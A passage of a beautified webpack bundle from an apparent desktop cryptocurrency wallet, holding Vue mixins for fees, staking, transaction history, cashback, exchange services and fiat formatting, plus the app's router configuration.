                        : w[1]) || this.defaultGasLimit,
                    address: this.domainAddress || this.inputs.address,
                    sendAmount: v,
                    isToken: d,
                    contract: this.coin.contract,
                    denom: this.coin.denom,
                    custom: this.inputs.custom,
                  };
                }
                let x = this.$wallets.getWallet(
                  null !==
                    (i =
                      null === (n = this.coin) ||
                      void 0 === n ||
                      null === (c = n.getFeeTicker) ||
                      void 0 === c
                        ? void 0
                        : c.call(n)) && void 0 !== i
                    ? i
                    : this.coin.deprecatedParent
                );
                "VTHO" === this.coin.ticker
                  ? (x = this.coin)
                  : ["OP", "ARB"].includes(this.coin.deprecatedParent) &&
                    (x = this.$wallets.getWallet(this.coin.deprecatedParent));
                const T = await (g ? x.getFee(g) : x.getFee());
                ["NEO3", "GAS3"].includes(this.coin.id)
                  ? this.setFee(T)
                  : ["VET"].includes(this.coin.id)
                  ? this.setFee(this.coin.toCurrencyUnit(T, o))
                  : this.setFee(
                      d ||
                        ("ONT" === this.coin.ticker &&
                          "BSC" !== this.coin.deprecatedParent)
                        ? this.parent.toCurrencyUnit(T)
                        : this.coin.toCurrencyUnit(T)
                    ),
                  (this.fee.ticker = this.feeTicker);
              });
          },
        },
      };
      t.default = c;
    },
    4903: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      const a = 150;
      var s = {
        data: () => ({ page: 0 }),
        methods: {
          handleScrollEnd(e) {
            const { scrollHeight: t, offsetHeight: i, scrollTop: s } = e.target;
            t - (i + s) > a || this.isListEnded || (this.page += 1);
          },
        },
      };
      t.default = s;
    },
    4904: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = {
        data: () => ({ openedIds: [] }),
        methods: {
          removeOpenedId(e) {
            const t = this.openedIds.filter((t) => e !== t);
            this.openedIds = t;
          },
          addOpenedId(e) {
            this.openedIds.push(e);
          },
        },
      };
      t.default = a;
    },
    4905: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(66)),
        n = i(17);
      const o = 4,
        r = 6,
        c = 5e3;
      var l = {
        props: { staking: { type: Object, default: () => ({}) } },
        data: () => ({
          settings: {
            rate: "",
            tickerToSend: "",
            receiveWalletId: "",
            tickerToReceive: "",
          },
          errorMessage: "",
          txId: "",
          isClaiming: !1,
          isError: !1,
          isSuccess: !1,
          showHelpPopup: !1,
          fetchCoinInfoTimeout: null,
          successClaimedAmount: 0,
        }),
        computed: {
          ...(0, n.mapGetters)(["excludedCurrenciesExchange"]),
          dailyReward() {
            let e = new s.default(this.staking.balance)
              .dividedBy(this.settings.rate)
              .toString();
            return (
              (e = Number(e) > 1 ? Number(e).toFixed(o) : Number(e).toFixed(r)),
              Number(e) || 0
            );
          },
          trxBalance() {
            const {
              balances: { total: e },
            } = this.$wallets.getWallet("TRX", "atomic");
            return Number(e) || 0;
          },
          coin() {
            return this.$wallets.getWallet(this.staking.id, "atomic");
          },
          parent() {
            return this.$wallets.getWallet(this.coin.deprecatedParent);
          },
          unclaimed() {
            const { balances: e } = this.coin;
            return (e && e.rewards) || 0;
          },
          unbonding() {
            const { balances: e } = this.coin;
            return (e && e.unbonding) || 0;
          },
          receiveWallet() {
            return this.settings.receiveWalletId
              ? this.$wallets.getWallet(this.settings.receiveWalletId)
              : null;
          },
          receiveBalance() {
            var e;
            const t =
              null === (e = this.receiveWallet) || void 0 === e
                ? void 0
                : e.divisibleBalance;
            return this.fixedBalance(t) || 0;
          },
          isPossibleToBuy() {
            return !this.excludedCurrenciesExchange.includes(this.coin.ticker);
          },
        },
        mounted() {
          this.fetchCoinInfo(),
            this.$bus.$on("close-staking-exchange-popup", this.closeHandler);
        },
        beforeDestroy() {
          this.$bus.$off("close-staking-exchange-popup", this.closeHandler),
            clearTimeout(this.fetchCoinInfoTimeout);
        },
        methods: {
          fetchCoinInfo() {
            clearTimeout(this.fetchCoinInfoTimeout),
              (this.fetchCoinInfoTimeout = setTimeout(async () => {
                try {
                  "SOL" === this.staking.ticker
                    ? await this.coin.getInfo({ ignoreCache: !0 })
                    : "AWC-986" === this.staking.ticker
                    ? await this.parent.getInfo()
                    : await this.coin.getInfo();
                } catch (e) {
                  console.log(e);
                }
              }, c));
          },
          closeHandler() {
            this.$emit("closePopup");
          },
          goBuy(e) {
            let t = this.coin;
            e && (t = this.$wallets.getWallet(e)),
              this.$router.push({
                path: "/exchange",
                query: { coinToReceive: t.id },
              });
          },
          fixedBalance(e) {
            const t = Number(e);
            return t > 1 ? t.toFixed(o) : t.toFixed(r);
          },
          backToStakeTable() {
            this.backToStake(), this.$emit("closePopup");
          },
          backToStake() {
            (this.isSuccess = !1), (this.isError = !1);
          },
          async claim() {
            const { isValid: e, message: t } = this.validate();
            if (!e) return void (this.errorMessage = t);
            this.isClaiming = !0;
            const i = await this.coin.claim().catch((e) => {
              this.errorMessage = e && e.message.replace("Error: ", "");
            });
            i
              ? ((this.successClaimedAmount = this.unclaimed),
                (this.isSuccess = !0),
                (this.txId = i.txid))
              : (this.isError = !0),
              (this.isClaiming = !1);
          },
          formatAmount(e) {
            return new Intl.NumberFormat("en-US").format(e);
          },
        },
      };
      t.default = l;
    },
    4906: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      const a = 6e4;
      var s = {
        props: { tx: { type: Object, default: () => {} } },
        computed: {
          address() {
            return this.tx.otherSideAddress &&
              "..." !== this.tx.otherSideAddress
              ? this.tx.direction
                ? this.parentAddress
                : this.tx.otherSideAddress
              : this.parentAddress;
          },
          amountUnit() {
            return "vote" !== this.txType
              ? this.tx.ticker
              : "1" === this.tx.amount
              ? "Vote"
              : "Votes";
          },
          description() {
            const e = {
              freeze: "Freeze",
              reward: "Claim rewards",
              claim: "Claim rewards",
              withdraw: "Withdraw",
              stake: "Stake",
              unstake: "Unstake",
              vote: "Vote",
            };
            return this.isOperation ? e[this.txType] : this.targetAddress;
          },
          txType() {
            var e, t;
            return (
              (null === (e = this.tx) ||
              void 0 === e ||
              null === (t = e.txType) ||
              void 0 === t
                ? void 0
                : t.toLowerCase()) || ""
            );
          },
          isOperation() {
            return [
              "freeze",
              "reward",
              "stake",
              "unstake",
              "vote",
              "withdraw",
              "claim",
            ].includes(this.txType);
          },
          isPending() {
            const e = ["ETH", "XMR"].includes(this.parent.ticker),
              t =
                Number(this.tx.confirmations) <
                this.pendingConfirmations[this.parent.ticker];
            return e && t;
          },
          isResendButton() {
            if (
              "ETH" !== this.parent.ticker ||
              !this.isPending ||
              this.tx.direction
            )
              return !1;
            const e = Number(this.tx.timestamp),
              t = e + this.parent.resendTimeout * a;
            return Date.now() >= t;
          },
          parent() {
            const { deprecatedParent: e, parent: t } = this.$wallets.getWallet(
              this.tx.walletid
            );
            return this.$wallets.getWallet(e || t);
          },
          parentAddress() {
            const { address: e } = this.parent;
            return e;
          },
          placeholderPaymentId() {
            return this.getPlaceholderPaymentId(
              this.tx.ticker,
              this.parent.ticker
            );
          },
          targetAddress() {
            return this.tx.direction ? this.tx.otherSideAddress : this.address;
          },
        },
        data: () => ({
          pendingConfirmations: { ETH: 1, XMR: 1 },
          windowWidth: null,
        }),
        methods: {
          formatAddress(e) {
            if (!e) return "";
            const [, t] = this.maxAddressSize();
            return this.$options.filters.$formatTextTrimMiddle(e, t);
          },
          open() {
            const { explorer: e } = this.parent;
            this.$electron.openExternal(`${e.webUrl}${this.tx.txid}`);
          },
        },
      };
      t.default = s;
    },
    4907: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = i(17);
      var s = {
        data: () => ({ awcBalance: 0, estimatedCashback: "0" }),
        computed: {
          ...(0, a.mapGetters)(["coinRate", "fiatRate"]),
          isMember() {
            var e;
            return null ===
              (e = this.$cashback.currentLevel(this.awcBalance)) || void 0 === e
              ? void 0
              : e.isMember;
          },
          isCashbackAvaliable() {
            return (
              this.isMember &&
              !isNaN(this.estimatedCashback) &&
              Number(this.estimatedCashback) >= 0
            );
          },
        },
        watch: {
          async cashbackParams() {
            await this.calculateCashback();
          },
        },
        async mounted() {
          await this.updateAwcBalance(), await this.calculateCashback();
        },
        methods: {
          async updateAwcBalance() {
            this.awcBalance = await this.$membership.getBalance();
          },
          async calculateCashback() {
            let e = 0;
            this.cashbackParams &&
              this.cashbackParams.amount &&
              Number(this.cashbackParams.amount > 0) &&
              this.isCashbackAvaliable &&
              (e = await this.$cashback.calculateCashback(
                this.cashbackParams.amount,
                this.cashbackParams.wallet,
                this.awcBalance
              )),
              (this.estimatedCashback = e || 0);
          },
        },
      };
      t.default = s;
    },
    4908: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(66)),
        n = i(17);
      const o = 100,
        r = 2,
        c = 4,
        l = 6;
      var d = {
        data: () => ({
          showCoinInfoPopup: !1,
          activeCoin: null,
          showSendCoinPopup: !1,
          showReceiveCoinPopup: !1,
        }),
        computed: {
          ...(0, n.mapGetters)([
            "fiatRate",
            "coinRate",
            "walletWizard",
            "balanceSummary",
            "chartDataTickerByZoom",
          ]),
          walletsForTable() {
            return this.filterWallets.map((e) => {
              const {
                  divisibleBalance: t,
                  ticker: i,
                  name: a,
                  id: n,
                  contract: o,
                  parent: c,
                  confirmed: l,
                } = e,
                d = this.chartDataTickerByZoom({ ticker: i }).data,
                {
                  rate: u,
                  change: h = 0,
                  marketCap: p = 0,
                } = this.coinRate(this.fiatRate, this.$wallets.getWallet(n)),
                m = this.getCoinBalance(t, i, n),
                f = this.fixedBalance(m),
                v = this.$options.filters.formatFiat(m * u, this.fiatRate, 1),
                g = new s.default(v)
                  .dividedBy(this.valueForOnePercent())
                  .toString(),
                b = this.$options.filters.formatFiat(u, this.fiatRate),
                w = {
                  icon: "" + this.$iconClass(e),
                  fiatRate: this.fiatRate,
                  isPlaceholder: 0 === u,
                  portfolioToShow: Number(g || 0).toFixed(r),
                  id: n,
                  rate: u,
                  name: a,
                  price: b,
                  value: v,
                  parent: c,
                  deprecatedParent: c,
                  change: h,
                  ticker: i,
                  balance: m,
                  contract: o,
                  portfolio: g,
                  marketCap: p,
                  chartData: d,
                  confirmed: l,
                  fixedBalance: f,
                  isToken: c !== n,
                };
              return l && this.updateCoinBalance({ balance: m, id: n }), w;
            });
          },
        },
        methods: {
          ...(0, n.mapActions)(["updateCoinBalance"]),
          valueForOnePercent() {
            const e = localStorage.getItem(this.fiatRate + "-fiatBalance"),
              t = this.balanceSummary(this.fiatRate);
            return Number(new s.default(t || e).dividedBy(o).toString()) || 1;
          },
          getCoinBalance(e, t, i) {
            const a = localStorage.getItem(i + "-balance"),
              s = Number(e || a || 0);
            return s;
          },
          fixedBalance(e) {
            return Number(e > 1 ? e.toFixed(c) : e.toFixed(l));
          },
          closeCoinInfoPopup() {
            this.showCoinInfoPopup = !this.showCoinInfoPopup;
          },
          closeSendCoinPopup() {
            this.showSendCoinPopup = !this.showSendCoinPopup;
          },
          closeReceiveCoinPopup() {
            this.showReceiveCoinPopup = !this.showReceiveCoinPopup;
          },
          toggleSendCoinPopup(e, t) {
            void 0 === t && (t = null),
              (this.resendParams = t),
              (this.activeCoin = e),
              this.closeSendCoinPopup();
          },
          toggleReceiveCoinPopup(e) {
            (this.activeCoin = e), this.closeReceiveCoinPopup();
          },
          changeActiveCoin(e) {
            this.activeCoin = e;
          },
          editToken(e) {
            this.closeCoinInfoPopup(), this.$emit("editToken", e);
          },
          toggleCoinInfoPopup(e) {
            let { id: t, alias: i = "atomic" } = e;
            const a = this.$wallets.getWallet(t, i);
            "" === a.address && "EOS" === a.id
              ? this.toggleWizard(a)
              : ((this.activeCoin = a), this.closeCoinInfoPopup());
          },
        },
      };
      t.default = d;
    },
    4909: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = i(17);
      const s = 3e3;
      var n = {
        computed: {
          ...(0, a.mapGetters)(["isMocked"]),
          currentService() {
            return this.$exchanges.getService(
              this.$exchanges.getCurrentServiceName()
            );
          },
        },
        data() {
          return { exchangeRate: null };
        },
        methods: {
          cancelRequests() {
            this.currentService.cancelAnyRequests();
          },
          getCurrencies() {
            return this.currentService.getCurrencies();
          },
          async getFilteredCurrencies() {
            return this.$exchanges.getAvailableWalletIdCollection(
              this.currenciesExchange,
              this.$wallets
            );
          },
          getStatus(e) {
            return this.currentService.getStatus(e);
          },
          getRate(e, t, i) {
            return this.currentService.getExchangeAmount(e, t, i);
          },
          getMinimalAmount(e, t) {
            return this.currentService.getMinAndMaxAmount(e, t);
          },
          validateExchangeTx(e) {
            return this.currentService.validateExchangeTx(e);
          },
          refundTransaction(e) {
            if (this.isMocked)
              return new Promise((e) =>
                setTimeout(() => {
                  e({ result: !0 });
                }, s)
              );
            const { id: t, refundAddress: i } = e;
            return this.currentService.exchangeRefund(t, i);
          },
          exchangeContinue(e) {
            return this.isMocked
              ? new Promise((e) =>
                  setTimeout(() => {
                    e({ result: !0 });
                  }, s)
                )
              : this.currentService.exchangeContinue(e.id);
          },
          async createExchangeTransaction(e, t, i, a, s, n, o, r) {
            try {
              const c = await this.currentService.createTransaction(
                e,
                t,
                i,
                a,
                s,
                o,
                r
              );
              if (!c)
                throw new Error(
                  "Can't create exchange transaction, service unavailable"
                );
              const l = this.$exchanges.getPreorder(e, t, s, n);
              return (
                this.$exchanges.postCashbackExchangeTx(
                  c,
                  this.$wallets.hash,
                  s,
                  r,
                  a,
                  l,
                  this.$exchanges.getCurrentServiceName()
                ),
                this.$exchanges.addExchangeTransactionToDb(
                  c,
                  this.$wallets.hash,
                  s,
                  r,
                  a,
                  l
                ),
                c
              );
            } catch (c) {
              console.error(c);
            }
          },
          async sendTransaction(e, t, i, a, s, n) {
            return (
              void 0 === a && (a = null),
              void 0 === n && (n = null),
              this.$exchanges.sendTransaction(
                e,
                this.$wallets.getWallet(e.deprecatedParent),
                t,
                i,
                a,
                s,
                n
              )
            );
          },
        },
      };
      t.default = n;
    },
    4910: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = i(17);
      const s = 3;
      var n = {
        computed: {
          ...(0, a.mapGetters)(["stakingSettings"]),
          feeReserveCoef() {
            const e = (this.coin.feeData && this.coin.feeData.reserveCoef) || s;
            return "Stake" === this.sendType ? e : 1;
          },
        },
        methods: {
          setStakingValidator() {
            var e;
            const t =
                this.stakingSettings.find((e) => {
                  let { ticker: t } = e;
                  return this.coin.ticker === t;
                }).defaultValidator ||
                (null === (e = this.stakingSettings[0]) || void 0 === e
                  ? void 0
                  : e.name) ||
                "",
              i =
                localStorage.getItem(
                  `selected::${this.coin.ticker}::validator`
                ) || t;
            this.selectedStakingValidator = this.$staking
              .getStakingInterface(this.coin.ticker)
              .validators.find((e) => {
                let { address: t, name: a } = e;
                return t === i || a === i;
              }).name;
          },
          getPlaceholderPaymentId(e, t) {
            return ["XLM", "KIN", "EOS"].includes(e)
              ? "Memo.ID"
              : ["XEM", "TON"].includes(t)
              ? "Message"
              : [
                  "BNB",
                  "ATOM",
                  "HBAR",
                  "BAND",
                  "LUNC",
                  "LUNA",
                  "OSMO",
                  "KAVA",
                  "INJ",
                  "CRO",
                ].includes(t)
              ? "Memo"
              : "XMR" === e
              ? "Payment ID"
              : "Destination tag";
          },
          backToWallets() {
            this.clearInputs(), this.$emit("closePopup");
          },
        },
      };
      t.default = n;
    },
    4911: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = i(17),
        s = {
          props: { coin: { type: Object, default: null } },
          computed: {
            ...(0, a.mapGetters)(["fiatRate", "stakingRate"]),
            feeWallet() {
              return this.$wallets.getWallet(this.coin.feeTicker);
            },
            parent() {
              return this.$wallets.getWallet(this.coin.deprecatedParent);
            },
            ticker() {
              return "AWC-986" === this.coin.ticker ? "AWC" : this.coin.ticker;
            },
          },
          methods: {
            buyCoin() {
              this.buy(this.coin);
            },
            saveSuccessStaking(e, t) {
              void 0 === e && (e = null), void 0 === t && (t = null);
              const i = e || (this.inputs && this.inputs.amount) || "",
                a = t || (this.inputs && this.inputs.address) || "",
                s = {
                  currency: this.coin.ticker,
                  atomicId: this.$wallets.hash,
                  hash: this.txid,
                  amount: i,
                  orderId: null,
                  providerAddress: a,
                  provider:
                    (this.stakingValidator && this.stakingValidator.name) || "",
                  yearlyIncome: this.stakingProfit || "",
                  walletVersion: `${this.appConfig.platform} ${this.appConfig.version}`,
                  platform: this.appConfig.platform,
                  payoutAddress: this.coin.address,
                  bnbAddress: this.$wallets.getWallet("BNB").address,
                };
              this.$staking.saveSuccessStaking(s);
            },
          },
        };
      t.default = s;
    },
    4912: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = i(17),
        n = a(i(66));
      const o = 1e-6,
        r = 2,
        c = 6,
        l = 8,
        d = 8,
        u = 2,
        h = 4,
        p = 2,
        m = 8;
      var f = {
        methods: {
          hasRate(e) {
            let { id: t } = e;
            if (!this.$rates || !this.$rates.data) return !1;
            const i = this.$rates.data[t];
            return i && i[this.fiatRate] && !0;
          },
          roundFiat(e, t) {
            if ((void 0 === t && (t = c), /^\./.test(e))) return e;
            const i = 1e8,
              a =
                /\.$|\.0{1,6}$|(?<=\.[0-9]{1,6})0{1,6}$|(?<=[0-9]{1,6}\.[0-9]{1,6})0{1,6}$/g,
              s = /(?<!0\.[0-9]{0,6})0{1,6}(?=[0-9]{1,6})/g;
            let n = e.toString().match(s),
              o = this.numberToFixed(e.toString()),
              r = o.match(a);
            return (
              (r = null === r ? "" : r[0]),
              (n = null === n || 0 !== parseInt(e[0]) ? "" : n[0]),
              (o = Math.ceil((o * i).toFixed(t)) / i),
              n + o.toString() + r
            );
          },
          numberToFixed(e, t) {
            if ((void 0 === t && (t = c), !e)) return "";
            let i = e;
            const [a, s] = i.toString().split(".");
            return (
              s && s.length >= t && (i = `${a}.${s.slice(0, t)}`), i.toString()
            );
          },
          balanceInFiat(e) {
            const t = this.$wallets.getWallet(e);
            if (!t) return "0.00";
            const i = this.coinRate(this.fiatRate, t).rate * t.divisibleBalance;
            return i
              ? "BTC" === this.fiatRate
                ? i.toFixed(m)
                : i.toFixed(p)
              : "0.00";
          },
          getValueFiat(e, t, i) {
            if ((void 0 === i && (i = !1), !e || "0" === e)) return 0;
            const a = this.$rates.getCoinPrice(t, this.fiatRate),
              s = new n.default(e),
              r = s.multipliedBy(a).toFixed(d);
            return "BTC" === this.fiatRate
              ? r
              : r > 1
              ? parseFloat(r).toFixed(u)
              : r < o
              ? r
              : i
              ? parseFloat(r).toFixed(h)
              : r;
          },
          formatNumber(e, t) {
            let {
              locale: i = "en-US",
              currency: a,
              minDecimals: s,
              maxDecimals: n,
            } = t;
            const o = { minimumFractionDigits: s, maximumFractionDigits: n };
            return (
              a && Object.assign(o, { currency: a, style: "currency" }),
              new Intl.NumberFormat(i, o).format(+e || 0)
            );
          },
          calculateFiatValue(e, t) {
            let { id: i } = t;
            const { rate: a = 0 } = this.coinRate(
                this.fiatRate,
                this.$wallets.getWallet(i)
              ),
              s = new n.default(+e || 0).multipliedBy(a);
            return this.formatFinanceValue(s);
          },
          formatFinanceValue(e, t) {
            const i = +e || 0;
            let a;
            return (
              (a = "BTC" === this.fiatRate ? l : i < o || i > 1 ? r : c),
              this.formatNumber(i, {
                minDecimals: r,
                maxDecimals: a,
                currency: t,
              })
            );
          },
          getFinanceValue(e) {
            const t = new n.default(+e || 0),
              i = 1e-6;
            let a;
            return (
              (a = "BTC" === this.fiatRate ? l : t < i || t > 1 ? r : c),
              new Intl.NumberFormat("en-US", {
                minimumFractionDigits: r,
                maximumFractionDigits: a,
              }).format(t)
            );
          },
        },
        computed: { ...(0, s.mapGetters)(["fiatRate", "coinRate"]) },
      };
      t.default = f;
    },
    4913: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = i(30),
        s = i(17);
      const n = 15,
        o = 3e3;
      let r = [];
      var c = {
        methods: {
          ...(0, s.mapActions)(["setWalletsState", "updateWalletState"]),
          data() {
            return { walletsAcc: [], accTimeout: null };
          },
          setWalletsHandler() {
            this.setWalletsState(Array.from(this.$wallets));
          },
          assumeWallets(e) {
            clearTimeout(this.accTimeout);
            const t = this.$wallets.getWallet(e);
            if (
              t &&
              (r.push(t),
              (this.accTimeout = setTimeout(() => {
                const e = r
                  .map((e) => this.$wallets.getWallet(e.id))
                  .filter(Boolean);
                this.setWalletsState(e);
              }, o)),
              r.length > n)
            ) {
              const e = [
                ...r.map((e) => this.$wallets.getWallet(e.id)).filter(Boolean),
              ];
              this.setWalletsState(e), (r = []);
            }
          },
          updateWalletsHandler(e) {
            this.assumeWallets(e);
          },
          async socketConfirmedTxHandler(e) {
            let { id: t } = e;
            const i = t,
              s = this.$wallets.getWallet(i),
              n = this.$wallets.getWallet(s.deprecatedParent);
            if (
              s instanceof a.Token &&
              ["ETH", "LUNC"].includes(s.deprecatedParent)
            ) {
              n.getInfo({
                isToken: !0,
                contract: s.contract,
                ticker: s.ticker,
              });
              const e = await n.getTransactions();
              this.$wallets.transactions(e);
            } else n.getInfo();
          },
        },
        computed: { ...(0, s.mapGetters)(["walletsState"]) },
        mounted() {
          this.$bus.$on("save::wallets", this.setWalletsHandler),
            this.$bus.$on("update::fiat-balance", this.setWalletsHandler),
            this.$bus.$on("update::coin-list", this.setWalletsHandler),
            this.$bus.$on("update::balances", this.setWalletsHandler),
            this.$bus.$on("update::balance", this.updateWalletsHandler),
            this.$bus.$on(
              "socket::tx::confirmed",
              this.socketConfirmedTxHandler
            );
        },
        beforeDestroy() {
          clearTimeout(this.accTimeout),
            this.$bus.$off("save::wallets", this.setWalletsHandler),
            this.$bus.$off("update::fiat-balance", this.setWalletsHandler),
            this.$bus.$off("update::coin-list", this.setWalletsHandler),
            this.$bus.$off("update::balances", this.setWalletsHandler),
            this.$bus.$off("update::balance", this.updateWalletsHandler),
            this.$bus.$off(
              "socket::tx::confirmed",
              this.socketConfirmedTxHandler
            );
        },
      };
      t.default = c;
    },
    4914: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = {
        props: { id: { type: String, required: !0 } },
        data() {
          return {
            currentStage: "activate",
            fee: null,
            feeEnough: !0,
            copied: !1,
            transaction: {
              txid: null,
              isError: !1,
              isSuccess: !1,
              isLoading: !0,
            },
          };
        },
        computed: {
          ticker() {
            return this.coin.ticker.toUpperCase();
          },
          icon() {
            return `${this.$iconClass(
              this.coin
            )} icon-${this.ticker.toLowerCase()}`;
          },
          fiatFee() {
            return this.getValueFiat(this.fee, {
              id: this.coin.network,
              confirmed: !0,
            });
          },
          coin() {
            return this.$wallets.getWallet(this.id);
          },
        },
        async created() {
          await this.setFee();
        },
        methods: {
          async handleActivate(e) {
            if (this.feeEnough) {
              (this.transaction = {
                isLoading: !0,
                isError: !1,
                isSuccess: !1,
                txid: null,
              }),
                await this.handleChangeStage("result");
              try {
                const t = await e();
                (this.transaction.txid =
                  null === t || void 0 === t ? void 0 : t.txid),
                  (this.transaction.isSuccess = !0);
              } catch (t) {
                console.error(t), (this.transaction.isError = !0);
              } finally {
                this.transaction.isLoading = !1;
              }
            }
          },
          async handleSetFee(e) {
            try {
              const t = await e();
              (this.fee = this.coin.toCurrencyUnit(t)),
                (this.feeEnough = await this.coin.isAvailableForSend(this.fee));
            } catch (t) {
              console.error(t);
            }
          },
          handleNavigate() {
            this.$bus.$emit("activate-coin", { id: null });
          },
          async handleChangeStage(e) {
            this.$debounce(() => {
              this.$nextTick(() => {
                this.currentStage = e;
              });
            }, 50);
          },
        },
      };
      t.default = a;
    },
    4915: function (e, t, i) {
      "use strict";
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var a = i(17),
        s = {
          computed: {
            ...(0, a.mapGetters)(["fiatCharacter"]),
            coin() {
              return this.$wallets.getWallet(this.token.coinId);
            },
            avatar() {
              var e;
              return null === (e = this.token) || void 0 === e
                ? void 0
                : e.getImageUrl();
            },
            sendText() {
              var e, t;
              return `You sent your ${
                null !==
                  (e =
                    null === (t = this.token) || void 0 === t
                      ? void 0
                      : t.name) && void 0 !== e
                  ? e
                  : ""
              } NFT out`;
            },
          },
        };
      t.default = s;
    },
    5057: function (e, t, i) {
      "use strict";
      var a = i(0);
      Object.defineProperty(t, "__esModule", { value: !0 }),
        (t.default = void 0);
      var s = a(i(224)),
        n = a(i(5058)),
        o = a(i(5059)),
        r = a(i(5086)),
        c = a(i(5453)),
        l = a(i(5457)),
        d = a(i(5458)),
        u = a(i(5497)),
        h = a(i(5498)),
        p = a(i(5500)),
        m = i(5513),
        f = i(5526),
        v = i(5536),
        g = i(5545);
      s.default.use(n.default);
      var b = new n.default({
        scrollBehavior() {
          return { x: 0, y: 0 };
        },
        routes: [
          {
            path: "/entry",
            name: "entry-page",
            component: m.Entry,
            props: !0,
            children: [
              {
                path: "login",
                name: "login-page",
                component: m.Login,
                meta: 0.1,
              },
              {
                path: "restore",
                name: "restore-page",
                component: m.Restore,
                meta: 0.2,
              },
              {
                path: "create",
                name: "create-page",
                component: m.Create,
                meta: 0.3,
              },
            ],
          },
          {
            path: "/main",
            name: "main-page",
            component: r.default,
            children: [
              {
                path: "info/:id",
                name: "main-coin-id-info",
                component: r.default,
              },
              {
                path: "receive/:id",
                name: "main-coin-id-receive",
                component: r.default,
              },
              {
                path: "send/:id",
                name: "main-coin-id-send",
                component: r.default,
              },
            ],
          },
          { path: "/portfolio", name: "portfolio-page", component: h.default },
          { path: "/history", name: "history-page", component: c.default },
          {
            path: "/settings",
            component: u.default,
            children: [
              {
                path: "",
                name: "membership-tab",
                component: g.MembershipTab,
                meta: 1.1,
              },
              {
                path: "change-password",
                name: "change-password-tab",
                component: g.SecurityTab,
                meta: 1.3,
              },
              {
                path: "private-keys",
                name: "private-keys-tab",
                component: g.PrivateKeys,
                meta: 1.4,
              },
            ],
          },
          { path: "/invite", component: p.default, name: "invite-friends" },
          { path: "/support", name: "support-page", component: l.default },
          {
            path: "/exchange",
            component: f.Exchange,
            children: [
              { path: "", name: "exchange-basic", component: f.ExchangeBasic },
              {
                path: "/exchange/history",
                name: "exchange-history",
                component: f.ExchangeHistory,
              },
            ],
          },
          {
            path: "/simplex",
            component: v.SimplexMain,
            children: [
              {
                path: "",
                name: "simplex-page",
                component: v.SimplexExchange,
                children: [
                  {
                    path: ":tickerToSend/:walletToReceive",
                    name: "simplex-with-tickers",
                    component: v.SimplexExchange,
                    children: [
                      {
                        path: ":value",
                        name: "simplex-with-tickers-value",
                        component: v.SimplexExchange,
                      },
                    ],
                  },
                ],
              },
              {
                path: "/simplex/history",
                name: "simplex-history-tab",
                component: v.SimplexHistory,
              },
              {
                path: "/simplex/webview",
                name: "simplex-webview-tab",
                component: v.SimplexWebview,
              },
            ],
          },
          {
            path: "/staking",
            name: "staking-page",
            component: d.default,
            children: [
              {
                path: ":ticker",
                name: "staking-with-tickers",
                component: d.default,
              },
            ],
          },
          {
            path: "/nft",
            name: "nft-page",
            component: o.default,
            children: [
              {
                path: "receive/:id",
                name: "nft-id-receive",
                component: o.default,
              },
            ],
          },
          { path: "*", redirect: "/entry" },
        ],
      });
      t.default = b;
    },
    5059: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(708),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1247),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5086: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(724),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1285),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5453: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(762),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1289),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5457: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(766),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1290),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5458: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(767),
        s = i.n(a);
      for (var n in a)
        ["default"].indexOf(n) < 0 &&
          (function (e) {
            i.d(t, e, function () {
              return a[e];
            });
          })(n);
      var o = i(1330),
        r = i(1),
        c = !1,
        l = null,
        d = null,
        u = null,
        h = Object(r["a"])(s.a, o["a"], o["b"], c, l, d, u);
      t["default"] = h.exports;
    },
    5497: function (e, t, i) {
      "use strict";
      i.r(t);
      var a = i(807),
